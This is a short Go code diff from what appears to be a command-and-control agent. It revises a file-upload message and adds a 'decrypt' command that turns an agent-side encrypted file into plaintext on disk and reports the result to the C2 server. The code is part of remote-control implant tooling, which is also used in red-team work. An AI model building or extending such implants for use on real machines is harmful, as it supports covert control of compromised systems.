@@ -125,11 +125,41 @@ func putCmdRun(cmd *cobra.Command, args []string) {
 		util.MemFileLock.RUnlock()
 
 		if isMem {
-			msg += fmt.Sprintf("\n\nFile saved to memory: %s . Use `cp` to copy to disk.", destPath)
+			msg += fmt.Sprintf("\n\nFile saved to memory: %s. Use `decrypt` to save to disk.", destPath)
 		} else {
 			msg += "\n\nFile saved to DISK (encrypted)."
 		}
 	}
 
 	c2transport.NotifyC2(cmd, "%s", msg)
+}
+
+// decryptCmdRun decrypts a file on agent and writes to disk
+func decryptCmdRun(cmd *cobra.Command, args []string) {
+	path, _ := cmd.Flags().GetString("path")
+	out, _ := cmd.Flags().GetString("out")
+
+	if path == "" {
+		c2transport.NotifyC2(cmd, "args error: path is required")
+		return
+	}
+	if out == "" {
+		out = path + ".dec"
+		c2transport.NotifyC2(cmd, "Output path not specified, using: %s", out)
+	}
+
+	logging.Printf("Decrypting %s to %s", path, out)
+	data, err := util.ReadFileAgent(path)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Read error: %v", err)
+		return
+	}
+
+	// Write plaintext directly to disk (bypassing WriteFileAgent/encryption)
+	err = os.WriteFile(out, data, 0600)
+	if err != nil {
+		c2transport.NotifyC2(cmd, "Write error: %v", err)
+		return
+	}
+	c2transport.NotifyC2(cmd, "Decrypted %s to %s", path, out)
 }
